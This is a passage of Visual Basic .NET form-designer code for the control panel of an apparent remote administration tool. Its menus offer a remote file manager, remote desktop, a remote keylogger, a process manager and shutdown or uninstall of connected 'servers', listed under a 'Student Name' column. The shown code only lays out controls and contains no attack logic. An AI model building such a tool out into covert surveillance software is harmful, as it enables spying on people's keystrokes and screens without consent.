<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class frmMain
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frmMain))
        Me.lbl1 = New System.Windows.Forms.Label()
        Me.so = New System.Windows.Forms.Label()
        Me.ContextMenuStrip1 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.RemoteFileMangerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteKayloggerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ProcessManagerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.FunToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TextToSpechToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ComputerToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.LogoffToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.RestartToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ShutdownToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.UninstallToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CheckBox1 = New System.Windows.Forms.CheckBox()
        Me.CheckBox2 = New System.Windows.Forms.CheckBox()
        Me.P1 = New System.Windows.Forms.PictureBox()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Button3 = New System.Windows.Forms.Button()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.CheckBox3 = New System.Windows.Forms.CheckBox()
        Me.NumericUpDown1 = New System.Windows.Forms.NumericUpDown()
        Me.c1 = New System.Windows.Forms.ComboBox()
        Me.c = New System.Windows.Forms.NumericUpDown()
        Me.ii = New System.Windows.Forms.ImageList(Me.components)
        Me.c2 = New System.Windows.Forms.ComboBox()
        Me.ExitToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripSeparator()
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.ContextMenuStrip2 = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.SdfghToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.L1 = New System.Windows.Forms.ListView()
        Me.ColumnHeader1 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader2 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader3 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader6 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader7 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.ColumnHeader5 = CType(New System.Windows.Forms.ColumnHeader(), System.Windows.Forms.ColumnHeader)
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.Label4 = New System.Windows.Forms.Label()
        Me.lblDescription = New System.Windows.Forms.Label()
        Me.lblTitle = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Button1 = New System.Windows.Forms.Button()
        Me.ContextMenuStrip1.SuspendLayout()
        CType(Me.P1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.NumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.c, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.ContextMenuStrip2.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.SuspendLayout()
        '
        'lbl1
        '
        Me.lbl1.AutoSize = True
        Me.lbl1.Location = New System.Drawing.Point(69, 307)
        Me.lbl1.Name = "lbl1"
        Me.lbl1.Size = New System.Drawing.Size(158, 19)
        Me.lbl1.TabIndex = 23
        Me.lbl1.Text = "Listening On Port : -----"
        '
        'so
        '
        Me.so.AutoSize = True
        Me.so.Location = New System.Drawing.Point(69, 281)
        Me.so.Name = "so"
        Me.so.Size = New System.Drawing.Size(111, 19)
        Me.so.TabIndex = 11
        Me.so.Text = "Server Online [0]"
        '
        'ContextMenuStrip1
        '
        Me.ContextMenuStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoteFileMangerToolStripMenuItem, Me.RemoteToolStripMenuItem, Me.RemoteKayloggerToolStripMenuItem, Me.ProcessManagerToolStripMenuItem, Me.FunToolStripMenuItem, Me.TextToSpechToolStripMenuItem, Me.ComputerToolStripMenuItem, Me.CloseToolStripMenuItem})
        Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
        Me.ContextMenuStrip1.Size = New System.Drawing.Size(181, 180)
        '
        'RemoteFileMangerToolStripMenuItem
        '
        Me.RemoteFileMangerToolStripMenuItem.Image = CType(resources.GetObject("RemoteFileMangerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteFileMangerToolStripMenuItem.Name = "RemoteFileMangerToolStripMenuItem"
        Me.RemoteFileMangerToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.RemoteFileMangerToolStripMenuItem.Text = "Remote File Manger"
        '
        'RemoteToolStripMenuItem
        '
        Me.RemoteToolStripMenuItem.Image = CType(resources.GetObject("RemoteToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteToolStripMenuItem.Name = "RemoteToolStripMenuItem"
        Me.RemoteToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.RemoteToolStripMenuItem.Text = "Remote Desktop"
        '
        'RemoteKayloggerToolStripMenuItem
        '
        Me.RemoteKayloggerToolStripMenuItem.Image = CType(resources.GetObject("RemoteKayloggerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.RemoteKayloggerToolStripMenuItem.Name = "RemoteKayloggerToolStripMenuItem"
        Me.RemoteKayloggerToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.RemoteKayloggerToolStripMenuItem.Text = "Remote Kaylogger"
        '
        'ProcessManagerToolStripMenuItem
        '
        Me.ProcessManagerToolStripMenuItem.Image = CType(resources.GetObject("ProcessManagerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem"
        Me.ProcessManagerToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.ProcessManagerToolStripMenuItem.Text = "Process Manager"
        '
        'FunToolStripMenuItem
        '
        Me.FunToolStripMenuItem.Image = CType(resources.GetObject("FunToolStripMenuItem.Image"), System.Drawing.Image)
        Me.FunToolStripMenuItem.Name = "FunToolStripMenuItem"
        Me.FunToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.FunToolStripMenuItem.Text = "Control"
        '
        'TextToSpechToolStripMenuItem
        '
        Me.TextToSpechToolStripMenuItem.Image = CType(resources.GetObject("TextToSpechToolStripMenuItem.Image"), System.Drawing.Image)
        Me.TextToSpechToolStripMenuItem.Name = "TextToSpechToolStripMenuItem"
        Me.TextToSpechToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.TextToSpechToolStripMenuItem.Text = "Text to Spech"
        '
        'ComputerToolStripMenuItem
        '
        Me.ComputerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LogoffToolStripMenuItem, Me.RestartToolStripMenuItem, Me.ShutdownToolStripMenuItem})
        Me.ComputerToolStripMenuItem.Image = CType(resources.GetObject("ComputerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ComputerToolStripMenuItem.Name = "ComputerToolStripMenuItem"
        Me.ComputerToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.ComputerToolStripMenuItem.Text = "Computer"
        '
        'LogoffToolStripMenuItem
        '
        Me.LogoffToolStripMenuItem.Name = "LogoffToolStripMenuItem"
        Me.LogoffToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.LogoffToolStripMenuItem.Text = "Logoff"
        '
        'RestartToolStripMenuItem
        '
        Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
        Me.RestartToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.RestartToolStripMenuItem.Text = "Restart"
        '
        'ShutdownToolStripMenuItem
        '
        Me.ShutdownToolStripMenuItem.Name = "ShutdownToolStripMenuItem"
        Me.ShutdownToolStripMenuItem.Size = New System.Drawing.Size(128, 22)
        Me.ShutdownToolStripMenuItem.Text = "Shutdown"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CloseToolStripMenuItem1, Me.UninstallToolStripMenuItem})
        Me.CloseToolStripMenuItem.Image = CType(resources.GetObject("CloseToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.CloseToolStripMenuItem.Text = "Server"
        '
        'CloseToolStripMenuItem1
        '
        Me.CloseToolStripMenuItem1.Name = "CloseToolStripMenuItem1"
        Me.CloseToolStripMenuItem1.Size = New System.Drawing.Size(120, 22)
        Me.CloseToolStripMenuItem1.Text = "close"
        '
        'UninstallToolStripMenuItem
        '
        Me.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem"
        Me.UninstallToolStripMenuItem.Size = New System.Drawing.Size(120, 22)
        Me.UninstallToolStripMenuItem.Text = "Uninstall"
        '
        'CheckBox1
        '
        Me.CheckBox1.AutoSize = True
        Me.CheckBox1.Checked = True
        Me.CheckBox1.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CheckBox1.Location = New System.Drawing.Point(20, 92)
        Me.CheckBox1.Name = "CheckBox1"
        Me.CheckBox1.Size = New System.Drawing.Size(96, 17)
        Me.CheckBox1.TabIndex = 17
        Me.CheckBox1.Text = "Show Desktop"
        Me.CheckBox1.UseVisualStyleBackColor = True
        '
        'CheckBox2
        '
        Me.CheckBox2.AutoSize = True
        Me.CheckBox2.Checked = True
        Me.CheckBox2.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CheckBox2.Location = New System.Drawing.Point(153, 92)
        Me.CheckBox2.Name = "CheckBox2"
        Me.CheckBox2.Size = New System.Drawing.Size(61, 17)
        Me.CheckBox2.TabIndex = 18
        Me.CheckBox2.Text = "Repeat"
        Me.CheckBox2.UseVisualStyleBackColor = True
        '
        'P1
        '
        Me.P1.BackColor = System.Drawing.SystemColors.ActiveCaptionText
        Me.P1.Location = New System.Drawing.Point(70, 111)
        Me.P1.Name = "P1"
        Me.P1.Size = New System.Drawing.Size(241, 167)
        Me.P1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.P1.TabIndex = 16
        Me.P1.TabStop = False
        '
        'TextBox1
        '
        Me.TextBox1.Location = New System.Drawing.Point(48, 58)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(91, 25)
        Me.TextBox1.TabIndex = 11
        Me.TextBox1.Text = "Carl"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(10, 32)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(38, 19)
        Me.Label2.TabIndex = 24
        Me.Label2.Text = "Port:"
        '
        'Button3
        '
        Me.Button3.ForeColor = System.Drawing.Color.Black
        Me.Button3.Location = New System.Drawing.Point(70, 401)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(241, 40)
        Me.Button3.TabIndex = 11
        Me.Button3.Text = "Start"
        Me.Button3.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(3, 61)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(43, 19)
        Me.Label1.TabIndex = 14
        Me.Label1.Text = "PWD:"
        '
        'CheckBox3
        '
        Me.CheckBox3.AutoSize = True
        Me.CheckBox3.Checked = True
        Me.CheckBox3.CheckState = System.Windows.Forms.CheckState.Checked
        Me.CheckBox3.Location = New System.Drawing.Point(49, 88)
        Me.CheckBox3.Name = "CheckBox3"
        Me.CheckBox3.Size = New System.Drawing.Size(79, 17)
        Me.CheckBox3.TabIndex = 13
        Me.CheckBox3.Text = "Auto Listen"
        Me.CheckBox3.UseVisualStyleBackColor = True
        '
        'NumericUpDown1
        '
        Me.NumericUpDown1.Location = New System.Drawing.Point(48, 27)
        Me.NumericUpDown1.Name = "NumericUpDown1"
        Me.NumericUpDown1.Size = New System.Drawing.Size(91, 25)
        Me.NumericUpDown1.TabIndex = 10
        Me.NumericUpDown1.Value = New Decimal(New Integer() {92, 0, 0, 0})
        '
        'c1
        '
        Me.c1.FormattingEnabled = True
        Me.c1.Location = New System.Drawing.Point(109, 666)
        Me.c1.Name = "c1"
        Me.c1.Size = New System.Drawing.Size(141, 25)
        Me.c1.TabIndex = 13
        Me.c1.Visible = False
        '
        'c
        '
        Me.c.Location = New System.Drawing.Point(111, 632)
        Me.c.Name = "c"
        Me.c.Size = New System.Drawing.Size(140, 25)
        Me.c.TabIndex = 14
        Me.c.Value = New Decimal(New Integer() {20, 0, 0, 0})
        Me.c.Visible = False
        '
        'ii
        '
        Me.ii.ImageStream = CType(resources.GetObject("ii.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ii.TransparentColor = System.Drawing.Color.Transparent
        Me.ii.Images.SetKeyName(0, "F15-Sniper.png")
        Me.ii.Images.SetKeyName(1, "1.gif")
        Me.ii.Images.SetKeyName(2, "2.gif")
        Me.ii.Images.SetKeyName(3, "3.gif")
        Me.ii.Images.SetKeyName(4, "4.gif")
        Me.ii.Images.SetKeyName(5, "5.gif")
        Me.ii.Images.SetKeyName(6, "6.gif")
        Me.ii.Images.SetKeyName(7, "7.gif")
        Me.ii.Images.SetKeyName(8, "8.gif")
        Me.ii.Images.SetKeyName(9, "9.gif")
        Me.ii.Images.SetKeyName(10, "10.gif")
        Me.ii.Images.SetKeyName(11, "11.gif")
        Me.ii.Images.SetKeyName(12, "12.gif")
        Me.ii.Images.SetKeyName(13, "13.gif")
        Me.ii.Images.SetKeyName(14, "14.gif")
        Me.ii.Images.SetKeyName(15, "15.gif")
        Me.ii.Images.SetKeyName(16, "16.gif")
        Me.ii.Images.SetKeyName(17, "17.gif")
        Me.ii.Images.SetKeyName(18, "18.gif")
        Me.ii.Images.SetKeyName(19, "19.gif")
        Me.ii.Images.SetKeyName(20, "20.gif")
        Me.ii.Images.SetKeyName(21, "21.gif")
        Me.ii.Images.SetKeyName(22, "22.gif")
        Me.ii.Images.SetKeyName(23, "23.gif")
        Me.ii.Images.SetKeyName(24, "24.gif")
        Me.ii.Images.SetKeyName(25, "25.gif")
        Me.ii.Images.SetKeyName(26, "26.gif")
        Me.ii.Images.SetKeyName(27, "27.gif")
        Me.ii.Images.SetKeyName(28, "28.gif")
        Me.ii.Images.SetKeyName(29, "29.gif")
        Me.ii.Images.SetKeyName(30, "30.gif")
        Me.ii.Images.SetKeyName(31, "31.gif")
        Me.ii.Images.SetKeyName(32, "32.gif")
        Me.ii.Images.SetKeyName(33, "33.gif")
        Me.ii.Images.SetKeyName(34, "34.gif")
        Me.ii.Images.SetKeyName(35, "35.gif")
        Me.ii.Images.SetKeyName(36, "36.gif")
        Me.ii.Images.SetKeyName(37, "37.gif")
        Me.ii.Images.SetKeyName(38, "38.gif")
        Me.ii.Images.SetKeyName(39, "39.gif")
        Me.ii.Images.SetKeyName(40, "40.gif")
        Me.ii.Images.SetKeyName(41, "41.gif")
        Me.ii.Images.SetKeyName(42, "42.gif")
        Me.ii.Images.SetKeyName(43, "43.gif")
        Me.ii.Images.SetKeyName(44, "44.gif")
        Me.ii.Images.SetKeyName(45, "45.gif")
        Me.ii.Images.SetKeyName(46, "46.gif")
        Me.ii.Images.SetKeyName(47, "47.gif")
        Me.ii.Images.SetKeyName(48, "48.gif")
        Me.ii.Images.SetKeyName(49, "49.gif")
        Me.ii.Images.SetKeyName(50, "50.gif")
        Me.ii.Images.SetKeyName(51, "51.gif")
        Me.ii.Images.SetKeyName(52, "52.gif")
        Me.ii.Images.SetKeyName(53, "53.gif")
        Me.ii.Images.SetKeyName(54, "54.gif")
        Me.ii.Images.SetKeyName(55, "55.gif")
        Me.ii.Images.SetKeyName(56, "56.gif")
        Me.ii.Images.SetKeyName(57, "57.gif")
        Me.ii.Images.SetKeyName(58, "58.gif")
        Me.ii.Images.SetKeyName(59, "59.gif")
        Me.ii.Images.SetKeyName(60, "60.gif")
        Me.ii.Images.SetKeyName(61, "61.gif")
        Me.ii.Images.SetKeyName(62, "62.gif")
        Me.ii.Images.SetKeyName(63, "63.gif")
        Me.ii.Images.SetKeyName(64, "64.gif")
        Me.ii.Images.SetKeyName(65, "65.gif")
        Me.ii.Images.SetKeyName(66, "66.gif")
        Me.ii.Images.SetKeyName(67, "67.gif")
        Me.ii.Images.SetKeyName(68, "68.gif")
        Me.ii.Images.SetKeyName(69, "69.gif")
        Me.ii.Images.SetKeyName(70, "70.gif")
        Me.ii.Images.SetKeyName(71, "71.gif")
        Me.ii.Images.SetKeyName(72, "72.gif")
        Me.ii.Images.SetKeyName(73, "73.gif")
        Me.ii.Images.SetKeyName(74, "74.gif")
        Me.ii.Images.SetKeyName(75, "75.gif")
        Me.ii.Images.SetKeyName(76, "76.gif")
        Me.ii.Images.SetKeyName(77, "77.gif")
        Me.ii.Images.SetKeyName(78, "78.gif")
        Me.ii.Images.SetKeyName(79, "79.gif")
        Me.ii.Images.SetKeyName(80, "80.gif")
        Me.ii.Images.SetKeyName(81, "81.gif")
        Me.ii.Images.SetKeyName(82, "82.gif")
        Me.ii.Images.SetKeyName(83, "83.gif")
        Me.ii.Images.SetKeyName(84, "84.gif")
        Me.ii.Images.SetKeyName(85, "85.gif")
        Me.ii.Images.SetKeyName(86, "86.gif")
        Me.ii.Images.SetKeyName(87, "87.gif")
        Me.ii.Images.SetKeyName(88, "88.gif")
        Me.ii.Images.SetKeyName(89, "89.gif")
        Me.ii.Images.SetKeyName(90, "90.gif")
        Me.ii.Images.SetKeyName(91, "91.gif")
        Me.ii.Images.SetKeyName(92, "92.gif")
        Me.ii.Images.SetKeyName(93, "93.gif")
        Me.ii.Images.SetKeyName(94, "94.gif")
        Me.ii.Images.SetKeyName(95, "95.gif")
        Me.ii.Images.SetKeyName(96, "96.gif")
        Me.ii.Images.SetKeyName(97, "97.gif")
        Me.ii.Images.SetKeyName(98, "98.gif")
        Me.ii.Images.SetKeyName(99, "99.gif")
        Me.ii.Images.SetKeyName(100, "100.gif")
        Me.ii.Images.SetKeyName(101, "101.gif")
        Me.ii.Images.SetKeyName(102, "102.gif")
        Me.ii.Images.SetKeyName(103, "103.gif")
        Me.ii.Images.SetKeyName(104, "104.gif")
        Me.ii.Images.SetKeyName(105, "105.gif")
        Me.ii.Images.SetKeyName(106, "106.gif")
        Me.ii.Images.SetKeyName(107, "107.gif")
        Me.ii.Images.SetKeyName(108, "108.gif")
        Me.ii.Images.SetKeyName(109, "109.gif")
        Me.ii.Images.SetKeyName(110, "110.gif")
        Me.ii.Images.SetKeyName(111, "111.gif")
        Me.ii.Images.SetKeyName(112, "112.gif")
        Me.ii.Images.SetKeyName(113, "113.gif")
        Me.ii.Images.SetKeyName(114, "114.gif")
        Me.ii.Images.SetKeyName(115, "115.gif")
        Me.ii.Images.SetKeyName(116, "116.gif")
        Me.ii.Images.SetKeyName(117, "117.gif")
        Me.ii.Images.SetKeyName(118, "118.gif")
        Me.ii.Images.SetKeyName(119, "119.gif")
        Me.ii.Images.SetKeyName(120, "120.gif")
        Me.ii.Images.SetKeyName(121, "121.gif")
        Me.ii.Images.SetKeyName(122, "122.gif")
        Me.ii.Images.SetKeyName(123, "123.gif")
        Me.ii.Images.SetKeyName(124, "124.gif")
        Me.ii.Images.SetKeyName(125, "125.gif")
        Me.ii.Images.SetKeyName(126, "126.gif")
        Me.ii.Images.SetKeyName(127, "127.gif")
        Me.ii.Images.SetKeyName(128, "128.gif")
        Me.ii.Images.SetKeyName(129, "129.gif")
        Me.ii.Images.SetKeyName(130, "130.gif")
        Me.ii.Images.SetKeyName(131, "131.gif")
        Me.ii.Images.SetKeyName(132, "132.gif")
        Me.ii.Images.SetKeyName(133, "133.gif")
        Me.ii.Images.SetKeyName(134, "134.gif")
        Me.ii.Images.SetKeyName(135, "135.gif")
        Me.ii.Images.SetKeyName(136, "136.gif")
        Me.ii.Images.SetKeyName(137, "137.gif")
        Me.ii.Images.SetKeyName(138, "138.gif")
        Me.ii.Images.SetKeyName(139, "139.gif")
        Me.ii.Images.SetKeyName(140, "140.gif")
        Me.ii.Images.SetKeyName(141, "141.gif")
        Me.ii.Images.SetKeyName(142, "142.gif")
        Me.ii.Images.SetKeyName(143, "143.gif")
        Me.ii.Images.SetKeyName(144, "144.gif")
        Me.ii.Images.SetKeyName(145, "145.gif")
        Me.ii.Images.SetKeyName(146, "146.gif")
        Me.ii.Images.SetKeyName(147, "147.gif")
        Me.ii.Images.SetKeyName(148, "148.gif")
        Me.ii.Images.SetKeyName(149, "149.gif")
        Me.ii.Images.SetKeyName(150, "150.gif")
        Me.ii.Images.SetKeyName(151, "151.gif")
        Me.ii.Images.SetKeyName(152, "152.gif")
        Me.ii.Images.SetKeyName(153, "153.gif")
        Me.ii.Images.SetKeyName(154, "154.gif")
        Me.ii.Images.SetKeyName(155, "155.gif")
        Me.ii.Images.SetKeyName(156, "156.gif")
        Me.ii.Images.SetKeyName(157, "157.gif")
        Me.ii.Images.SetKeyName(158, "158.gif")
        Me.ii.Images.SetKeyName(159, "159.gif")
        Me.ii.Images.SetKeyName(160, "160.gif")
        Me.ii.Images.SetKeyName(161, "161.gif")
        Me.ii.Images.SetKeyName(162, "162.gif")
        Me.ii.Images.SetKeyName(163, "163.gif")
        Me.ii.Images.SetKeyName(164, "164.gif")
        Me.ii.Images.SetKeyName(165, "165.gif")
        Me.ii.Images.SetKeyName(166, "166.gif")
        Me.ii.Images.SetKeyName(167, "167.gif")
        Me.ii.Images.SetKeyName(168, "168.gif")
        Me.ii.Images.SetKeyName(169, "169.gif")
        Me.ii.Images.SetKeyName(170, "170.gif")
        Me.ii.Images.SetKeyName(171, "171.gif")
        Me.ii.Images.SetKeyName(172, "172.gif")
        Me.ii.Images.SetKeyName(173, "173.gif")
        Me.ii.Images.SetKeyName(174, "174.gif")
        Me.ii.Images.SetKeyName(175, "175.gif")
        Me.ii.Images.SetKeyName(176, "176.gif")
        Me.ii.Images.SetKeyName(177, "177.gif")
        Me.ii.Images.SetKeyName(178, "178.gif")
        Me.ii.Images.SetKeyName(179, "179.gif")
        Me.ii.Images.SetKeyName(180, "180.gif")
        Me.ii.Images.SetKeyName(181, "181.gif")
        Me.ii.Images.SetKeyName(182, "182.gif")
        Me.ii.Images.SetKeyName(183, "183.gif")
        Me.ii.Images.SetKeyName(184, "184.gif")
        Me.ii.Images.SetKeyName(185, "185.gif")
        Me.ii.Images.SetKeyName(186, "186.gif")
        Me.ii.Images.SetKeyName(187, "187.gif")
        Me.ii.Images.SetKeyName(188, "188.gif")
        Me.ii.Images.SetKeyName(189, "189.gif")
        Me.ii.Images.SetKeyName(190, "190.gif")
        Me.ii.Images.SetKeyName(191, "191.gif")
        Me.ii.Images.SetKeyName(192, "192.gif")
        Me.ii.Images.SetKeyName(193, "193.gif")
        Me.ii.Images.SetKeyName(194, "194.gif")
        Me.ii.Images.SetKeyName(195, "195.gif")
        Me.ii.Images.SetKeyName(196, "196.gif")
        Me.ii.Images.SetKeyName(197, "197.gif")
        Me.ii.Images.SetKeyName(198, "198.gif")
        Me.ii.Images.SetKeyName(199, "199.gif")
        Me.ii.Images.SetKeyName(200, "200.gif")
        Me.ii.Images.SetKeyName(201, "201.gif")
        Me.ii.Images.SetKeyName(202, "202.gif")
        Me.ii.Images.SetKeyName(203, "203.gif")
        Me.ii.Images.SetKeyName(204, "204.gif")
        Me.ii.Images.SetKeyName(205, "205.gif")
        Me.ii.Images.SetKeyName(206, "206.gif")
        Me.ii.Images.SetKeyName(207, "207.jpg")
        Me.ii.Images.SetKeyName(208, "208.gif")
        Me.ii.Images.SetKeyName(209, "209.gif")
        Me.ii.Images.SetKeyName(210, "210.gif")
        Me.ii.Images.SetKeyName(211, "211.gif")
        Me.ii.Images.SetKeyName(212, "212.gif")
        Me.ii.Images.SetKeyName(213, "213.gif")
        Me.ii.Images.SetKeyName(214, "214.gif")
        Me.ii.Images.SetKeyName(215, "215.gif")
        Me.ii.Images.SetKeyName(216, "216.gif")
        Me.ii.Images.SetKeyName(217, "217.gif")
        Me.ii.Images.SetKeyName(218, "218.gif")
        Me.ii.Images.SetKeyName(219, "219.gif")
        Me.ii.Images.SetKeyName(220, "220.gif")
        Me.ii.Images.SetKeyName(221, "221.gif")
        Me.ii.Images.SetKeyName(222, "222.gif")
        Me.ii.Images.SetKeyName(223, "223.gif")
        Me.ii.Images.SetKeyName(224, "224.gif")
        Me.ii.Images.SetKeyName(225, "225.gif")
        Me.ii.Images.SetKeyName(226, "226.gif")
        Me.ii.Images.SetKeyName(227, "227.gif")
        Me.ii.Images.SetKeyName(228, "228.gif")
        Me.ii.Images.SetKeyName(229, "229.gif")
        Me.ii.Images.SetKeyName(230, "230.gif")
        Me.ii.Images.SetKeyName(231, "231.gif")
        Me.ii.Images.SetKeyName(232, "232.gif")
        Me.ii.Images.SetKeyName(233, "233.gif")
        Me.ii.Images.SetKeyName(234, "234.gif")
        Me.ii.Images.SetKeyName(235, "235.gif")
        Me.ii.Images.SetKeyName(236, "236.gif")
        Me.ii.Images.SetKeyName(237, "237.gif")
        Me.ii.Images.SetKeyName(238, "238.gif")
        Me.ii.Images.SetKeyName(239, "239.gif")
        Me.ii.Images.SetKeyName(240, "240.gif")
        Me.ii.Images.SetKeyName(241, "241.gif")
        Me.ii.Images.SetKeyName(242, "basic.png")
        Me.ii.Images.SetKeyName(243, "connections.png")
        Me.ii.Images.SetKeyName(244, "group.png")
        Me.ii.Images.SetKeyName(245, "misc.png")
        Me.ii.Images.SetKeyName(246, "user.png")
        Me.ii.Images.SetKeyName(247, "user_gray.png")
        '
        'c2
        '
        Me.c2.FormattingEnabled = True
        Me.c2.Location = New System.Drawing.Point(103, 689)
        Me.c2.Name = "c2"
        Me.c2.Size = New System.Drawing.Size(141, 25)
        Me.c2.TabIndex = 12
        Me.c2.Visible = False
        '
        'ExitToolStripMenuItem
        '
        Me.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem"
        Me.ExitToolStripMenuItem.Size = New System.Drawing.Size(103, 22)
        Me.ExitToolStripMenuItem.Text = "Exit"
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(100, 6)
        '
        'NotifyIcon1
        '
        Me.NotifyIcon1.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info
        Me.NotifyIcon1.ContextMenuStrip = Me.ContextMenuStrip2
        Me.NotifyIcon1.Visible = True
        '
        'ContextMenuStrip2
        '
        Me.ContextMenuStrip2.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.SdfghToolStripMenuItem, Me.ToolStripMenuItem1, Me.ExitToolStripMenuItem})
        Me.ContextMenuStrip2.Name = "ContextMenuStrip2"
        Me.ContextMenuStrip2.Size = New System.Drawing.Size(104, 54)
        '
        'SdfghToolStripMenuItem
        '
        Me.SdfghToolStripMenuItem.Name = "SdfghToolStripMenuItem"
        Me.SdfghToolStripMenuItem.Size = New System.Drawing.Size(103, 22)
        Me.SdfghToolStripMenuItem.Text = "Show"
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        '
        'L1
        '
        Me.L1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader6, Me.ColumnHeader7, Me.ColumnHeader5})
        Me.L1.ContextMenuStrip = Me.ContextMenuStrip1
        Me.L1.FullRowSelect = True
        Me.L1.GridLines = True
        Me.L1.LargeImageList = Me.ii
        Me.L1.Location = New System.Drawing.Point(317, 111)
        Me.L1.Name = "L1"
        Me.L1.Size = New System.Drawing.Size(729, 330)
        Me.L1.SmallImageList = Me.ii
        Me.L1.TabIndex = 16
        Me.L1.UseCompatibleStateImageBehavior = False
        Me.L1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
        Me.ColumnHeader1.Text = "Student Name"
        Me.ColumnHeader1.Width = 81
        '
        'ColumnHeader2
        '
